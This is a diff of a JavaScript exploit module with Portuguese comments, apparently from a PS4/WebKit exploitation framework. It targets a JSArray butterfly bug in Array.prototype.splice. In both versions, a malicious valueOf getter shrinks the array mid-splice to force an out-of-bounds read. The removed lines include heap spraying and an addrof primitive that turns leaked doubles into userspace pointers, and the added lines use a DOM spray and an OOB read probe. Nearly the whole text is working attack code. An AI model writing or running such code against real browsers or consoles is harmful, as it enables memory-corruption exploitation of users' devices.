@@ -1,99 +1,66 @@
+﻿import { Groomer } from '../mod_groomer.js';
+
 export default {
     id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
-    category: 'Exploit',
+    category: 'CoreJS',
     risk:     'CRITICAL',
     description:
-        'Primitiva addrof via Interleaving (Alinhamento Lado-a-Lado). Abandona o Aliasing ' +
-        'para evitar a segregação do bmalloc. Intercala Arrays Numéricos e Arrays de Objetos ' +
-        'para garantir que a leitura OOB do vetor corrompido acerte num ponteiro nativo vizinho.',
+        'Mutação do JSArray Butterfly durante a execução do C++ Array.prototype.splice. ' +
+        'O tamanho do array é reduzido a zero dentro de um getter maligno (valueOf) ' +
+        'enquanto o motor C++ está a mover os elementos. Resulta em Out-Of-Bounds (OOB).',
 
     setup: function() {
         this.results = {};
         
-        // A nossa cobaia
-        this.targetObj = document.createElement('div');
-        this.targetObj.id = "HOLY_GRAIL";
-
-        // HEAP FENG SHUI: O "Mil-Folhas" (Interleaving)
-        this.spray = [];
-        for (let i = 0; i < 1500; i++) {
-            // Criamos uma gaveta de 4 números
-            let numArr = [1.11, 2.22, 3.33, 4.44];
-            
-            // Colada a ela, criamos uma gaveta de 4 objetos
-            let objArr = [this.targetObj, this.targetObj, this.targetObj, this.targetObj];
-            
-            this.spray.push({ num: numArr, obj: objArr });
+        // Criamos o array vulnerável (Array de Doubles)
+        this.vulnArray = [];
+        for (let i = 0; i < 20; i++) {
+            this.vulnArray.push(1.111111 + i);
         }
-
-        // Escolhemos um array numérico no meio da "sanduíche" para ser o nosso alvo
-        this.vulnArray = this.spray[750].num;
 
         const self = this;
         this.evilObject = {
             valueOf: function() {
-                // O GATILHO: Enganamos o splice para encolher o array e descalibrar a Butterfly
+                // FIX: Agora aponta para o array correto e não para o próprio evilObject
                 self.vulnArray.length = 0;
-                return 0; 
+                
+                let trash = Groomer.sprayDOM('div', 1000);
+                return 9.999999;
             }
         };
     },
 
     trigger: function() {
         try {
-            // Dispara a bomba. O WebKit tenta ler o evilObject, corrompe o array e escreve 9.99
-            this.vulnArray.splice(this.evilObject, 0, 9.99);
-            
-            // O GOLPE: O vulnArray acha que tem tamanho 0, mas a sua memória física está corrompida.
-            // Vamos forçar a leitura fora dos limites (índices 0 até 15).
-            // Em algum destes índices, a memória do array vizinho (objArr) começa!
-            this.results.leakedData = [];
-            for (let i = 0; i < 15; i++) {
-                this.results.leakedData.push(this.vulnArray[i]);
-            }
+            // O GATILHO: Substituir o índice 5 pelo nosso objeto maligno.
+            // O WebKit vai ler o '.valueOf()' do objeto para o converter, disparando a nossa armadilha!
+            this.vulnArray.splice(5, 1, this.evilObject);
         } catch(e) {
             this.results.error = e.message;
         }
     },
 
     probe: [
-        s => s.results.error || 'Splice Executado - Sondando Vizinhos',
+        // Probe 0: Qual é o tamanho final do array para o motor C++? (Deveria ser 0 ou 20)
+        s => s.vulnArray.length,
         
-        // O Extrator addrof
+        // Probe 1: Tenta ler o índice 10. Se length for 0, isto devia ser 'undefined'.
+        // Se retornar um número, o C++ está a ler memória OOB!
+        s => typeof s.vulnArray[10],
+        
+        // Probe 2: O Leitor de OOB
         s => {
-            if (s.results.leakedData) {
-                // Vamos analisar cada pedaço de lixo que a memória nos devolveu
-                for (let i = 0; i < s.results.leakedData.length; i++) {
-                    let val = s.results.leakedData[i];
-                    
-                    // Se encontrarmos um número que não é os nossos canários
-                    if (typeof val === 'number' && val !== 1.11 && val !== 2.22 && val !== 3.33 && val !== 4.44 && val !== 9.99 && val !== 0 && !isNaN(val)) {
-                        
-                        const buf = new ArrayBuffer(8);
-                        const f64 = new Float64Array(buf);
-                        const u64 = new BigUint64Array(buf);
-                        
-                        f64[0] = val;
-                        const bits = u64[0];
-                        
-                        const addr = bits & 0x0000FFFFFFFFFFFFn;
-                        
-                        // Verifica se o ponteiro é fisicamente coerente com o Userspace da PS4
-                        if (addr > 0x100000n && addr < 0x7FFFFFFFFFFFn) {
-                            return `🏆 ADDROF [OOB Lado-a-Lado]: 0x${addr.toString(16).toUpperCase()} no índice [${i}]`;
-                        }
-                    }
-                }
+            let val = s.vulnArray[10];
+            if (typeof val === 'number' && !isNaN(val)) {
+                return `💥 SUCESSO! OOB Read (Lixo da RAM): ${val}`;
             }
-            return 0; // Falhou, tenta no próximo ciclo
+            return 'Protegido / Array Vazio';
         }
     ],
 
     cleanup: function() {
         this.vulnArray = null;
         this.evilObject = null;
-        this.targetObj = null;
-        this.spray = null;
-        this.results = {};
     }
 };
+
